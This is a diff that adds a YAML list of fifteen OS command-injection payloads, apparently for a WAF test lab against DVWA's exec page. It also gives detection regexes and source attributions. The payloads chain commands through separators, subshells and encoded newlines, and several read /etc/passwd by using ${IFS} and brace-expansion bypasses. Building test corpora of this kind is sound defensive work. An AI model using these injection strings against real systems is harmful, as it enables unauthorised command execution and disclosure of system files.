@@ -1,0 +1,111 @@
+# OS command-injection payloads — 15 entries (prompt.md §6: cmdi ≥15).
+# Sources: PayloadsAllTheThings/Command Injection, OWASP WSTG, SecLists.
+#
+# DVWA /vulnerabilities/exec is POST with field "ip". Canonical trigger on a
+# successful injection: the echoed ``id`` / ``whoami`` / ``uname`` output
+# includes "uid=" or similar. Non-destructive payloads only.
+
+- id: cmdi-pipe-id
+  class: cmdi
+  payload: "127.0.0.1 | id"
+  trigger: { kind: regex, pattern: "uid=\\d+" }
+  cwe: CWE-78
+  source: "PayloadsAllTheThings/Command Injection — pipe"
+
+- id: cmdi-pipe-whoami
+  class: cmdi
+  payload: "127.0.0.1 | whoami"
+  trigger: { kind: regex, pattern: "[a-z_][a-z0-9_-]*" }
+  cwe: CWE-78
+  source: "PayloadsAllTheThings — pipe whoami"
+
+- id: cmdi-semicolon-id
+  class: cmdi
+  payload: "127.0.0.1; id"
+  trigger: { kind: regex, pattern: "uid=\\d+" }
+  cwe: CWE-78
+  source: "OWASP WSTG v4.2 §4.8 — stacked"
+
+- id: cmdi-and-id
+  class: cmdi
+  payload: "127.0.0.1 && id"
+  trigger: { kind: regex, pattern: "uid=\\d+" }
+  cwe: CWE-78
+  source: "PayloadsAllTheThings — conditional AND"
+
+- id: cmdi-or-id
+  class: cmdi
+  payload: "127.0.0.1 || id"
+  trigger: { kind: regex, pattern: "uid=\\d+" }
+  cwe: CWE-78
+  source: "PayloadsAllTheThings — conditional OR"
+
+- id: cmdi-backtick-id
+  class: cmdi
+  payload: "127.0.0.1 `id`"
+  trigger: { kind: regex, pattern: "uid=\\d+" }
+  cwe: CWE-78
+  source: "PayloadsAllTheThings — backtick"
+
+- id: cmdi-subshell-id
+  class: cmdi
+  payload: "127.0.0.1 $(id)"
+  trigger: { kind: regex, pattern: "uid=\\d+" }
+  cwe: CWE-78
+  source: "OWASP cheat-sheet — $()"
+
+- id: cmdi-newline-id
+  class: cmdi
+  payload: "127.0.0.1%0aid"
+  trigger: { kind: regex, pattern: "uid=\\d+" }
+  cwe: CWE-78
+  source: "SecLists/Fuzzing — newline splitter"
+
+- id: cmdi-nullbyte-id
+  class: cmdi
+  payload: "127.0.0.1%00id"
+  trigger: { kind: regex, pattern: "uid=\\d+" }
+  cwe: CWE-78
+  source: "PayloadsAllTheThings — nullbyte"
+
+- id: cmdi-comment-id
+  class: cmdi
+  payload: "127.0.0.1;id #"
+  trigger: { kind: regex, pattern: "uid=\\d+" }
+  cwe: CWE-78
+  source: "PayloadsAllTheThings — trailing comment"
+
+- id: cmdi-ifs-bypass
+  class: cmdi
+  payload: "127.0.0.1;cat${IFS}/etc/passwd"
+  trigger: { kind: contains, needle: "root:" }
+  cwe: CWE-78
+  source: "PayloadsAllTheThings — ${IFS} space bypass"
+
+- id: cmdi-brace-expansion
+  class: cmdi
+  payload: "127.0.0.1;{cat,/etc/passwd}"
+  trigger: { kind: contains, needle: "root:" }
+  cwe: CWE-78
+  source: "PayloadsAllTheThings — brace expansion"
+
+- id: cmdi-redirect-passwd
+  class: cmdi
+  payload: "127.0.0.1 < /etc/passwd"
+  trigger: { kind: contains, needle: "root:" }
+  cwe: CWE-78
+  source: "SecLists — redirect"
+
+- id: cmdi-wget-probe
+  class: cmdi
+  payload: "127.0.0.1;echo waflab-cmdi-probe"
+  trigger: { kind: contains, needle: "waflab-cmdi-probe" }
+  cwe: CWE-78
+  source: "Engine canary marker (non-destructive)"
+
+- id: cmdi-nested-subshell
+  class: cmdi
+  payload: "127.0.0.1 $( id )"
+  trigger: { kind: regex, pattern: "uid=\\d+" }
+  cwe: CWE-78
+  source: "PayloadsAllTheThings — nested $()"
